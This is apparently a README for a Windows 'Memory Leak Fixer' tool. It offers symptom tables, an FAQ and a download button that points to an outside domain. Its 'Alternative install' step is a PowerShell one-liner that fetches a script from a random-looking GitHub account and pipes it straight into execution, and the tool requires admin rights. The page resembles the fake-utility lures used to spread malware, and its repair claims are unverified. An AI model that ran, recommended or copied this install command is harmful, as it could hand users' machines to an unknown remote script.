<div align="center">

<img src="https://img.shields.io/badge/Memory_Leak_Fixer-v2.0.0-2ea44f?style=for-the-badge" alt="Memory Leak Fixer">

# Memory Leak Fixer

**Fix high RAM usage, memory leaks, and out-of-memory errors on Windows 10/11.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/Version-2.0.0-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)

<br>

[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://memory.nexustool.fun/)

</div>

---

## About

**Memory Leak Fixer** detects and resolves memory leaks, high RAM usage, and memory management issues on Windows. It identifies processes consuming excessive memory, clears standby memory, repairs Windows memory management, and optimizes virtual memory settings.

If your PC gets slower over time and Task Manager shows 80-100% RAM usage even with nothing open, you likely have a memory leak. This tool fixes it.

### Alternative install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems This Fixes

### High RAM Usage

| Symptom | Cause | Fix Applied |
|---|---|---|
| **RAM usage 80-100%** with nothing open | Memory leak in Windows service or driver | Identifies leaking process, clears leaked memory |
| PC gets **slower over time** (fine after restart) | Standby memory not released | Flushes standby list, optimizes cache |
| **"Your computer is low on memory"** warning | Page file too small or disabled | Resizes page file, enables if disabled |
| **Programs crash** with out-of-memory error | Virtual memory exhausted | Expands virtual memory, clears standby |
| Task Manager shows **high "Committed" memory** | Commit charge exceeding physical RAM | Optimizes commit limit and page file |
| **System process** using gigabytes of RAM | Compressed Memory or ntoskrnl.exe leak | Resets Memory Compression, clears working set |
| **Desktop Window Manager** high memory | DWM memory leak (known Windows bug) | Restarts DWM, applies registry fix |
| **Browser** using too much RAM | Not a leak, but managed here too | Frees browser cache, optimizes settings |

### Memory Leak After Windows Update

| Symptom | Windows Update Cause | Fix |
|---|---|---|
| RAM climbs to 100% after updating | Update introduced driver memory leak | Identifies faulting driver, resets memory pools |
| **NonPaged Pool** keeps growing | Kernel driver not freeing memory | Identifies driver via poolmon analysis |
| System becomes **unresponsive** after hours | Gradual leak exhausting all RAM | Automatic standby list flush + leak isolation |

### Service & Pool Leaks

| Symptom | Cause | Fix |
|---|---|---|
| **svchost.exe high memory** (1-4 GB) | Windows service memory leak | Identifies leaking service, restarts it |
| **System process high memory** | Kernel driver not freeing allocations | Identifies driver via poolmon analysis |
| **NonPaged Pool keeps growing** | Kernel driver leak | Finds faulting driver, clears pool |
| **Paged Pool memory growing** | File system or network driver leak | Resets paging, identifies driver |
| **ntoskrnl.exe high memory** | Compressed memory store issue | Disables memory compression if needed |
| **SearchIndexer.exe high memory** | Windows Search indexing aggressively | Limits or disables Windows Search |
| **WMI Provider Host high memory** | WMI repository corruption | Rebuilds WMI repository |
| **Runtime Broker high memory** | UWP app leak | Resets Runtime Broker, identifies app |

### Gaming Memory Issues

| Symptom | Game | Fix |
|---|---|---|
| FPS drops after **long gaming sessions** | Any game | Clears standby list, optimizes for gaming |
| Game crashes with **"out of memory"** | Unreal Engine / Unity games | Expands page file, frees GPU shared memory |
| **VRAM leak** causing stuttering | GPU-intensive games | Resets GPU memory allocation |
| Steam / Epic client **memory bloat** | Launcher memory leak | Restarts launcher services cleanly |

---

## Preview

```
  +---------------------------------------------------+
  |          Memory Leak Fixer v2.0.0                 |
  +---------------------------------------------------+
  |                                                   |
  |  RAM Usage:  14.2 GB / 16.0 GB  (88%)            |
  |  Commit:     18.7 GB / 24.0 GB                   |
  |  Standby:    6.1 GB  (clearable)                  |
  |                                                   |
  |  Top Memory Consumers:                            |
  |  [!] dwm.exe               -- 2.4 GB (LEAK)      |
  |  [!] svchost.exe (nsi)     -- 1.8 GB (LEAK)      |
  |      chrome.exe            -- 1.2 GB (normal)     |
  |      explorer.exe          -- 380 MB (normal)     |
  |                                                   |
  |  [ Fix Leaks ]  [ Clear Standby ]  [ Exit ]      |
  |                                                   |
  +---------------------------------------------------+
```

---

## How It Works

1. **Analyze** -- Scans all running processes for abnormal memory growth patterns
2. **Detect** -- Identifies memory leaks by monitoring allocation trends over time
3. **Classify** -- Separates real leaks from normal high-usage processes
4. **Fix** -- Clears standby memory, restarts leaking services, optimizes page file
5. **Monitor** -- Optional background mode to auto-fix when RAM exceeds threshold

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | Works on any amount (2 GB to 128 GB) |
| Admin | Yes |
| Network | Not required |

---

## When To Use

- PC is **slow** and Task Manager shows high RAM usage
- RAM usage **keeps climbing** even when you close apps
- You see **"low memory"** warnings in Windows
- Games **stutter** or crash after long sessions
- You have to **restart** your PC every day to fix slowness
- After a **Windows Update** your PC uses more RAM than before
- **Desktop Window Manager (dwm.exe)** is using gigabytes of RAM

---

## FAQ

**Is this the same as a "RAM cleaner"?**
No. RAM cleaners just flush memory blindly, which can slow your PC down. This tool **identifies the actual leak** and fixes only what is broken. It also clears standby memory (which is safe and actually helps).

**Why is my RAM at 80% with nothing open?**
Windows caches frequently used data in standby memory. This is normal. But if "In Use" memory is high with nothing open, you have a leak. This tool distinguishes between the two.

**Will this help with gaming performance?**
Yes, if memory leaks or standby cache are causing your FPS drops. Clearing standby memory before gaming can free 2-8 GB of RAM.

**Is it safe?**
Yes. The tool uses documented Windows APIs (EmptyWorkingSet, NtSetSystemInformation) to manage memory. No system files are modified.

**Does it run in the background?**
Optional. You can enable auto-fix mode that monitors RAM usage and flushes standby when it exceeds a configurable threshold.

---

## License

[MIT](LICENSE)
